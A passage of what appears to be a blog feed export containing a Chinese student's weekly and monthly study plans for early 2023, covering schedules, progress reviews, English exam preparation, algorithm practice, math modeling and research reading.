<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>学习机器学习（2h）</li>
<li>学习计算机网络（2h）</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>刷编程题（1h）</li>
<li>刷客观题（1h）</li>
</ol>
<h3 id="深夜（24-00-2-00）"><a href="#深夜（24-00-2-00）" class="headerlink" title="深夜（24:00-2:00）"></a>深夜（24:00-2:00）</h3><ol>
<li>睡眠时间<ol>
<li>12:00 - 8:00（理想）</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.02.3rh.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.02.3rh.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-02-第三周计划"><a href="#2023-02-第三周计划" class="headerlink" title="2023.02.第三周计划"></a>2023.02.第三周计划</h1><h2 id="复盘"><a href="#复盘" class="headerlink" title="复盘"></a>复盘</h2><ol>
<li><p>要思考一下如何管理电子设备</p>
<ol>
<li>手机 —— 生活<ol>
<li>比如支付、健康码、电话、短信等</li>
</ol>
</li>
<li>电脑 —— 工作<ol>
<li>主要是用于写文章、写代码、</li>
</ol>
</li>
<li>平板 —— 学习<ol>
<li>就是替代手机的学习功能</li>
<li>主要是取代纸质方面的学习</li>
<li>突然之间感觉平板变得好鸡肋</li>
<li>唯一的用途就是替代纸</li>
</ol>
</li>
</ol>
</li>
<li><p>为了节省空间把科研栏目和数学放在一起</p>
</li>
<li><p>要重新确定一下娱乐计划</p>
</li>
<li><p>还有如何调整学习计划</p>
</li>
<li><p>平板的定位目前还不清楚</p>
</li>
<li><p>美国数学建模比赛终于结束了</p>
<ol>
<li><p>接下来要开始正常的学习了</p>
</li>
<li><p>还有这次比赛的总结要写</p>
<ol>
<li>排版有点问题</li>
<li>如代码排版没处理好</li>
<li>还有表格数据没处理好</li>
<li></li>
</ol>
</li>
<li><p>整理这次比赛的材料</p>
</li>
</ol>
</li>
<li><p>可能要放弃机器学习了</p>
<ol>
<li>首先就是学习周期比较长</li>
<li>同时我们平台不好，竞争不过别人</li>
</ol>
</li>
<li><p>这学期的上课时间如何安排</p>
</li>
<li><p>目前的想法是把一天的学习时间进行拆分</p>
<ol>
<li>上午：英语</li>
<li>中午：算法+sql刷题</li>
<li>下午：科研任务</li>
<li>晚上：应付学校课程+还有一些其他事情，如理财</li>
</ol>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>科研</li>
<li>还有要熟悉一下学习节奏了</li>
<li></li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>还有离散数学要如何学习<ol>
<li>就上课认真听讲就好了</li>
<li>下课认真完成笔记</li>
<li>尽量不要占用下课时间</li>
<li>争取期末能过就行了</li>
</ol>
</li>
<li>要找一下关于因果效益估计的论文<ol>
<li>从会议和期刊上面找</li>
<li>按年限</li>
<li>找一下有没有什么文献管理工具</li>
<li>最近5年</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li><p>准备开始计算机网络的学习<br>1. </p>
</li>
<li><p>算法方面</p>
<ol>
<li>动态规划题目</li>
<li>这个月差不多能把动态规划刷完</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天复习300个单词，直到复习完成以后，然后开始背新单词</li>
<li>剩下的英语学习时间可以用来练习听力</li>
<li>思考一下如何方便的练习阅读</li>
<li>上午的时间就是用来学习英语了</li>
<li>目前还还处于刚开学，先找一点耗时比较短的专项练习一下</li>
<li>先练习仔细阅读和翻译</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>要找个时间把数据库的理论学习一下</li>
<li>在做一个图书管理系统就可以申请翘课了</li>
<li>还要花时间学习一下爬虫</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>正常上学的作息</p>
<h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上午用于英语的学习</li>
<li>背单词(1h)</li>
<li>做阅读</li>
<li>听听力</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ul>
<li>刷算法题</li>
<li>sql</li>
</ul>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>下午的计划是用于科研方向的学习</li>
<li>下午的时间是最重要的学习时间</li>
<li>也就是<ol>
<li>科研方面的学习</li>
<li>还有数学建模的学习</li>
<li>晚上的学习更加偏向看书一点</li>
</ol>
</li>
<li>目前的计划是进行计算机的学习</li>
<li>可以是计算机底层的学习<ol>
<li>如数据结构、操作系统</li>
</ol>
</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>要进行编程技能的刷题（1h)<ol>
<li>只要是熟悉编程语言的操作</li>
<li>可以使用牛客网进行刷题</li>
</ol>
</li>
<li>晚上的时间主要用于编程方面的学习<ol>
<li>学习shell。mysql等</li>
</ol>
</li>
<li>也可以用于学校作业的完成</li>
<li>比如一下其他无所谓的学科作业</li>
<li>还有一些要填写的文件</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.02.MonthPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.02.MonthPlan/</url>
    <content><![CDATA[<h1 id="2023-2月计划"><a href="#2023-2月计划" class="headerlink" title="2023.2月计划"></a>2023.2月计划</h1><h2 id="上月总结"><a href="#上月总结" class="headerlink" title="上月总结"></a>上月总结</h2><ol>
<li>成功刷完MySQL</li>
<li>感觉进度还是有点慢</li>
<li></li>
</ol>
<h2 id="本月重点"><a href="#本月重点" class="headerlink" title="本月重点"></a>本月重点</h2><ol>
<li>开学准备</li>
<li>机器学习</li>
</ol>
<h2 id="Subject-to-Arrange"><a href="#Subject-to-Arrange" class="headerlink" title="Subject to Arrange"></a>Subject to Arrange</h2><h3 id="数学-x2F-科研"><a href="#数学-x2F-科研" class="headerlink" title="数学&#x2F;科研"></a>数学&#x2F;科研</h3><ol>
<li>要参加美赛</li>
<li>开始进行数学建模的学习</li>
<li>学习机器学习的内容</li>
<li>还要学习深度学习来应付科研的内容</li>
<li>有机会的话要花一点时间学习一下爬虫<ol>
<li>这样方便找资料</li>
</ol>
</li>
<li>要思考离散数学该如何学习</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>报名4级</li>
<li>等背单词进入正轨，要开始听力和阅读的练习</li>
</ol>
<h3 id="计算机-x2F-编程"><a href="#计算机-x2F-编程" class="headerlink" title="计算机&#x2F;编程"></a>计算机&#x2F;编程</h3><ol>
<li>计算机网络<ol>
<li>目前还没有制定学习计划</li>
</ol>
</li>
<li>MySQL要找一时间做一个项目<ol>
<li>还有数据库前面的理论的知识要找一个机会补一下</li>
<li>同时保持定期刷题这样数据库就可以结束了</li>
</ol>
</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ol>
<li>准备开学</li>
<li></li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.03.1st.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.03.1st.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-03-第一周计划"><a href="#2023-03-第一周计划" class="headerlink" title="2023.03.第一周计划"></a>2023.03.第一周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li><p>要重新确定一下娱乐计划</p>
<ol>
<li>我想按照上学期的方式进行</li>
<li>还是要有娱乐时间的</li>
<li>不然就会想上学期那样每天过的都很压抑</li>
</ol>
</li>
<li><p>平板的定位目前还不清楚</p>
<ol>
<li>目前的想法只是替代纸</li>
<li>原本想要替代书本，但是没有看书的习惯</li>
<li>现在的方案可能就是用来娱乐吧</li>
</ol>
</li>
<li><p>这学期的上课时间如何安排</p>
<ol>
<li>离散数学认真上课</li>
<li>计网和数据库</li>
<li></li>
</ol>
</li>
<li><p>感觉要养成每天复盘的习惯</p>
<ol>
<li>但是写出来有太浪费时间了</li>
<li>不写出来有没有这个习惯</li>
<li>我目前的计划就是下周计划的后面新增加一个模块</li>
<li>什么时候开始写</li>
</ol>
</li>
<li><p>还有一点就是现在微信公众号经常处于看不完的状态</p>
<ol>
<li>要找个时间来看一下</li>
<li>还有一点就是，我想通过公众号来了解什么</li>
<li>还有一个就是B站的热点如何处理</li>
<li>B站还是不能完全屏蔽掉，要有适当的娱乐</li>
</ol>
</li>
<li><p>要减少耳机的使用时间</p>
<ol>
<li>通过更换半入耳式耳机实现</li>
</ol>
</li>
<li><p>计划不布置的不够具体</p>
</li>
<li><p>英语学习计划可能进行改变</p>
<ol>
<li>可能要找一个课程来学习</li>
<li>靠我自己可能没法提高</li>
<li>目前想法是等正式报名在开始学习</li>
<li>现在先看一下那个课程更好</li>
</ol>
</li>
<li><p>正常的生活中不能少掉娱乐的时间</p>
</li>
<li><p>思考动态规划刷完以后要干嘛</p>
</li>
<li><p>单调栈</p>
</li>
<li><p>二叉树</p>
</li>
<li><p>蓝桥杯</p>
</li>
<li><p>二刷</p>
</li>
<li><p>数模的时间如何安排</p>
</li>
<li><p>放晚上，把一些学校课程的内容学完，剩下的时间就全部用来学习数模</p>
</li>
<li><p>还有科研的时间安排在哪里</p>
</li>
<li><p>集中到下午进行</p>
</li>
<li><p>全部时间都用于科研</p>
</li>
<li><p>要开始准备蓝桥杯比赛</p>
</li>
<li><p>4.8比赛，差不多还差一个月</p>
</li>
<li><p>3.8日的时候正式开始训练</p>
</li>
<li><p>开始刷历年真题</p>
</li>
<li><p>英语网课的选择</p>
</li>
<li><p>思考一下学习的顺序</p>
</li>
<li><p>也就是大概的流程</p>
</li>
<li><p>先学习提分比较快的</p>
<ol>
<li>阅读</li>
<li>翻译</li>
<li>写作</li>
<li>听力</li>
<li>后面在补单词</li>
</ol>
</li>
<li><p>还有就是打算把不背单词要不要先割舍一下</p>
<ol>
<li>感觉耗费的时间比较多</li>
<li>同时要思考一下用什么</li>
<li>背60个单词当热身</li>
<li>剩下时间用来看网课和练习</li>
</ol>
</li>
<li><p>要调整听音乐的节奏</p>
</li>
<li><p>中午和晚上刚吃完饭的时候可以听一下</p>
</li>
<li><p>外部环境太吵了，可以听一下</p>
</li>
<li><p>下午需要专注的活动不适宜听音乐</p>
</li>
<li></li>
<li><p>算法的学习节奏要调整一下</p>
</li>
<li><p>花20分钟将昨天的题目复习一下</p>
</li>
<li><p>花30分钟学习一下新的算法</p>
</li>
<li><p>刚开始不要求立刻理解</p>
</li>
<li><p>但是第二天要求大致理解</p>
</li>
<li><p>第一遍学习可以理解代码，并且能够复现出代码就行了</p>
</li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>科研<ol>
<li>这周把笔记大致完成</li>
</ol>
</li>
<li>数学建模<ol>
<li>机器学习方法学完</li>
<li>讲随机森林建库</li>
<li>神经网络、knn、</li>
</ol>
</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>离散数学完成作业</li>
<li>要开始看文献了，正式进入科研的工作<ol>
<li>阅读综述</li>
<li>用latex做笔记</li>
</ol>
</li>
<li>有能力阅读另一篇论文</li>
<li>数学建模<ol>
<li>将前面几次参加的数学建模算法代码</li>
<li>编写+调参+数据可视化</li>
<li>构建算法库</li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>准备开始计算机网络的学习<ol>
<li>跟上上课进度</li>
<li>要比上课进度多一节</li>
</ol>
</li>
<li>算法方面<ol>
<li>这周将代码随想录一刷结束</li>
<li>下周将代码随想录剩下没刷的结束了</li>
<li>下下周正式开始蓝桥杯的训练</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>每天复习300个单词，直到复习完成以后，然后开始背新单词</li>
<li>先练习仔细阅读和翻译</li>
<li>至少做5套试卷翻译和阅读</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>还要花时间学习一下爬虫</li>
<li>sql<ol>
<li>把牛客的第一章节结束</li>
</ol>
</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><ol>
<li>完成LaTex模板的建立</li>
<li>完成离散数学新一节的学习</li>
<li>综述看了7页，暂时还是没有掌握方法</li>
<li>算法和英语就按照正常计划进行</li>
<li>计网和数模不知道如何平衡</li>
<li></li>
</ol>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><ol>
<li>机器学习有进一步</li>
<li>明天用英语时间选一下课程</li>
<li></li>
</ol>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><ol>
<li>把动态规划结束了<ol>
<li>开始单调栈</li>
</ol>
</li>
<li>明天开始英语网课的学习</li>
<li>综述已经到具体方法了<ol>
<li>明天把欠下来的几个问题解决一下</li>
<li>并且把前两个方法大致了解一下</li>
<li>并把笔记补充完整</li>
</ol>
</li>
<li>机器学习感觉进度有点慢<ol>
<li>文本信息抽取</li>
<li>后面快速的把理论过一下</li>
<li>后天开始补充代码库</li>
</ol>
</li>
</ol>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><ol>
<li>机器学习课程学完</li>
<li>英语四级的学习还是没有进展，感觉是话的时间太少了</li>
<li>单调站完成</li>
<li>科研还是没有进展</li>
</ol>
<h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>正常上学的作息</p>
<h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上午用于英语的学习</li>
<li>背单词(1h)</li>
<li>做阅读</li>
<li>做翻译</li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ol>
<li>刷算法题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>主要进行科研方向的学习</li>
<li>如果任务暂时完成可以学习一些辅助科研的工具<ol>
<li>爬虫</li>
<li>下载一下论文</li>
<li>机器学习</li>
<li>Latex</li>
</ol>
</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>用于学校课程的学习<ol>
<li>计算机网络</li>
<li>离散数学</li>
<li>数据库组成原理</li>
</ol>
</li>
<li>也可以用于学校作业的完成</li>
<li>比如一下其他无所谓的学科作业</li>
<li>还有一些要填写的文件</li>
<li>数学建模的学习<ol>
<li>制作算法代码库</li>
<li>制作</li>
<li>除去计网和离散的学习，剩下时间全部用于学习数模</li>
</ol>
</li>
<li>最后半个小时有用于规划时间和制定计划</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.03.2nd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.03.2nd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-03-第二周计划"><a href="#2023-03-第二周计划" class="headerlink" title="2023.03.第二周计划"></a>2023.03.第二周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li>电子设备的管理<ol>
<li>电脑——用于学习</li>
<li>平板——学习</li>
<li>手机——娱乐和生活<ol>
<li>现在因为手机的问题，娱乐背安排到了平板</li>
<li>但是目前还是不知道平板可以用于解决学习的那个方面</li>
<li>用于上课做笔记，等一些不适合带电脑外出的地方去学习</li>
</ol>
</li>
</ol>
</li>
<li>中午吃完饭专门话半小时来阅读知乎和wx的信息<ol>
<li>包括大数据、qq群、知乎大数据、公众号、理财</li>
<li>可以一边听着音乐进行</li>
<li>不在完游戏</li>
</ol>
</li>
<li>吃完饭以后需不需要休息</li>
<li>摸鱼的时候干什么</li>
<li>latex</li>
<li>要注重单词的拼写</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>科研任务 —— 有一点起色</li>
<li>数学建模的练习 —— 还没有形成规范</li>
<li>蓝桥杯比赛的练习 —— 只开始一点</li>
<li>四六级的练习 —— 没有头绪</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>要开始看文献了，正式进入科研的工作<ol>
<li>阅读综述</li>
<li>用latex做笔记，最后几天进行拍版</li>
</ol>
</li>
<li>数学建模<ol>
<li>将前面几次参加的数学建模算法代码</li>
<li>编写+调参+数据可视化</li>
<li>构建算法库</li>
<li>要学习的算法<ol>
<li>SVM</li>
<li>XGboost</li>
<li>lightGvm</li>
<li>时间序列算法</li>
<li>三门问题</li>
<li>粒子群算法</li>
</ol>
</li>
</ol>
</li>
<li>先讲机器学习大致的算法学完在进行建库<ol>
<li></li>
</ol>
</li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>准备开始计算机网络的学习<ol>
<li>跟上上课进度</li>
<li>要比上课进度多一节</li>
</ol>
</li>
<li>算法方面<ol>
<li>开始刷蓝桥杯历年真题</li>
<li>从年份近的往年份远的刷</li>
<li>还有一个问题就是要不要刷别的组队</li>
<li>目前是先刷c++组的22和21省赛的题目</li>
<li>还要考虑一下leetcode和代码随想录怎么安排</li>
<li>leetcode简答题每天一道</li>
</ol>
</li>
<li>蓝桥杯练习策略<ol>
<li>每天中高难度的题目至少一道</li>
<li>低难度和填空题至少一道</li>
<li>leetcode简单题目一道</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>要开始背单词书了<ol>
<li>每天看一个list，同时要复习前一天所学的</li>
</ol>
</li>
<li>现在把主要的精力都花在听力上面<ol>
<li>上午的1.5小时</li>
</ol>
</li>
<li>但是用其他的时间来背</li>
<li>单词书为主、单词软件为辅助</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>1. </p>
<h2 id="每日复盘"><a href="#每日复盘" class="headerlink" title="每日复盘"></a>每日复盘</h2><h3 id="周一"><a href="#周一" class="headerlink" title="周一"></a>周一</h3><ol>
<li>感觉今天状态不是很好</li>
<li>思考要不要将科研时间调到晚上进行</li>
<li>这个在思考一下</li>
<li>算法今天的进度太低了</li>
<li>英语的学习策略要调整一下<ol>
<li>感觉要把所有视频都看完，时间不够</li>
</ol>
</li>
<li>今天数模没有进行学习<ol>
<li>想一下要如何安排</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="周二"><a href="#周二" class="headerlink" title="周二"></a>周二</h3><p>1. </p>
<h3 id="周三"><a href="#周三" class="headerlink" title="周三"></a>周三</h3><p>1. </p>
<p>2. </p>
<h3 id="周四"><a href="#周四" class="headerlink" title="周四"></a>周四</h3><ol>
<li>科研现在有陷入了僵局</li>
<li>算法有点提升</li>
<li>英语听力找到点苗头</li>
<li>学校的课程不知道如何进行下去</li>
<li>数模还有25%没有动</li>
</ol>
<h3 id="周五"><a href="#周五" class="headerlink" title="周五"></a>周五</h3><ol>
<li>蓝桥完成一题</li>
<li>明天要开会2021年题目的练习</li>
<li>马哲浪费了两个小时没去学习</li>
<li>latex整理了75% </li>
<li>英语听力有听了一节课</li>
<li></li>
</ol>
<h3 id="周六"><a href="#周六" class="headerlink" title="周六"></a>周六</h3><h3 id="周日"><a href="#周日" class="headerlink" title="周日"></a>周日</h3><h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><p>正常上学的作息</p>
<h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上课</li>
<li>学习英语（10:00-11:30）<ol>
<li>只练习听力</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ol>
<li>刷算法题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>数模的学习（2h）</li>
<li>其他课程的学习<ol>
<li>如离散数学、计网</li>
</ol>
</li>
<li>蓝桥杯的训练</li>
<li>以上任务灵活调配</li>
</ol>
<h3 id="晚上（19-00-22-00）"><a href="#晚上（19-00-22-00）" class="headerlink" title="晚上（19:00-22:00）"></a>晚上（19:00-22:00）</h3><ol>
<li>现在将晚上的时间固定为科研的时间段</li>
<li>最后半个小时有用于规划时间和制定计划</li>
</ol>
<h3 id="深夜"><a href="#深夜" class="headerlink" title="深夜"></a>深夜</h3><ol>
<li>一回去就洗澡</li>
<li>还要算上护肤的时间差不多</li>
<li>睡眠时间<ol>
<li>12:00 - 7:30（理想）</li>
<li>7.5小时</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>学习计划</category>
      </categories>
  </entry>
  <entry>
    <title>2023.03.3rd.WeeklyPlan</title>
    <url>/2023/01/01/%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/%E8%BF%98%E6%9C%AA%E6%95%B4%E7%90%86%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/2023.03.3rd.WeeklyPlan/</url>
    <content><![CDATA[<h1 id="2023-03-第三周计划"><a href="#2023-03-第三周计划" class="headerlink" title="2023.03.第三周计划"></a>2023.03.第三周计划</h1><h2 id="每周复盘"><a href="#每周复盘" class="headerlink" title="每周复盘"></a>每周复盘</h2><ol>
<li>周天下午也未必要学习</li>
<li>还是要每周定期找wy汇报科研工作的进展<ol>
<li>随便解决一下积累一周的困惑</li>
</ol>
</li>
<li>英语听力没什么进展</li>
<li>数学建模的算法还差一点</li>
<li>科研进度过于缓慢</li>
<li>要解决一下水课上课的问题</li>
<li>蓝桥杯还是没有规范化</li>
<li>当科研遇到问题时候不知道如何转换思路</li>
<li>感觉科研浪费的时间有点多</li>
<li>水课怎么水</li>
<li>感觉每周还是要以一个任务为主目标，来用全力完成，不然很分散精力</li>
<li>现在时间有点紧</li>
<li>感觉是有很多任务积压在任务序列里面</li>
<li>要把任务清理一下</li>
<li>首先先把算法库解决一下，只差一点了，两三天应该就能完成了，</li>
<li>算法库和科研并行研究</li>
<li>然后在进行蓝桥杯</li>
<li>在进行计算机网络</li>
<li>思考一下数模的安排</li>
<li>作为编程手，要缩小自己的学习范围</li>
<li>把机器学习的算法和数模常用模型搞定就结束</li>
<li>知道基本原理和如何调参就行</li>
<li>要不要增加学习时间</li>
<li>不能推迟晚上的学习时间，晚上还是要有娱乐活动的</li>
<li>可以提早学习时间</li>
<li>思考水课到底怎么高效的利用（知乎|B站）</li>
<li>数学建模下个月比赛之后还要在学一遍</li>
<li>要思考一下是否在做假努力</li>
<li>尽管每天都在学，但是有没有发挥最大的效率</li>
<li>要精化自己的学习内容</li>
<li>不要多学也不要少学</li>
<li>经过一段时间的尝试，感觉可以一天之内同时进行，两个大任务的研究</li>
<li>下午 —— 一个任务，</li>
<li>晚上 —— 一个任务</li>
<li>中午和上午还没想好，感觉是要做那种长期任务，</li>
<li>比如那种中刷题，和背单词，算一下时间，只用10:00 - 11:30， 和 12:30 - 14:00 共 3小时</li>
<li></li>
</ol>
<h2 id="学习任务"><a href="#学习任务" class="headerlink" title="学习任务"></a>学习任务</h2><h3 id="本周重点"><a href="#本周重点" class="headerlink" title="本周重点"></a>本周重点</h3><ol>
<li>蓝桥杯的训练</li>
<li>数学建模完成算法建库</li>
<li>科研工作的进行</li>
<li>英语听力</li>
</ol>
<h3 id="科研-x2F-数学"><a href="#科研-x2F-数学" class="headerlink" title="科研&#x2F;数学"></a>科研&#x2F;数学</h3><ol>
<li>科研</li>
<li>数学建模<ol>
<li>将前面几次参加的数学建模算法代码</li>
<li>编写+调参+数据可视化</li>
<li>构建算法库</li>
</ol>
</li>
<li>先讲机器学习大致的算法学完在进行建库</li>
<li>要注重练习数据的可视化</li>
<li></li>
</ol>
<h3 id="计算机"><a href="#计算机" class="headerlink" title="计算机"></a>计算机</h3><ol>
<li>准备开始计算机网络的学习<ol>
<li>跟上上课进度</li>
<li>要比上课进度多一节</li>
</ol>
</li>
<li>算法方面<ol>
<li>每天一道leetcode</li>
<li>整理笔记</li>
</ol>
</li>
<li>计算机网络的学习要提上日程<ol>
<li>同时应该要做思维导图来巩固知识</li>
</ol>
</li>
<li>蓝桥杯练习策略<ol>
<li>刷历年真题</li>
<li>最后一题可以不用刷</li>
<li>看了一下还是最好做自己本组的往年真题比较好</li>
</ol>
</li>
</ol>
<h3 id="英语"><a href="#英语" class="headerlink" title="英语"></a>英语</h3><ol>
<li>要开始背单词书了<ol>
<li>每天看一个list，同时要复习前一天所学的</li>
</ol>
</li>
<li>要开始背词组</li>
<li>单词书为主、单词软件为辅助</li>
<li>现在把主要的精力都花在听力上面<ol>
<li>上午的1.5小时</li>
<li>感觉没有什么进展</li>
<li></li>
</ol>
</li>
</ol>
<h3 id="编程"><a href="#编程" class="headerlink" title="编程"></a>编程</h3><ol>
<li>现在暂时不需要编程</li>
</ol>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><h2 id="生活作息"><a href="#生活作息" class="headerlink" title="生活作息"></a>生活作息</h2><h3 id="上午（8-00-12-00）"><a href="#上午（8-00-12-00）" class="headerlink" title="上午（8:00-12:00）"></a>上午（8:00-12:00）</h3><ol>
<li>上课</li>
<li>学习英语（10:00-11:30）<ol>
<li>只练习听力</li>
</ol>
</li>
<li></li>
</ol>
<h3 id="中午（13-00-14-00）"><a href="#中午（13-00-14-00）" class="headerlink" title="中午（13:00-14:00）"></a>中午（13:00-14:00）</h3><ol>
<li>刷算法题</li>
</ol>
<h3 id="下午（14-00-18-00）"><a href="#下午（14-00-18-00）" class="headerlink" title="下午（14:00-18:00）"></a>下午（14:00-18:00）</h3><ol>
<li>数模的学习（2h）</li>
<li>其他课程的学习<ol>
<li>如离散数学、计网</li>
</ol>
</li>
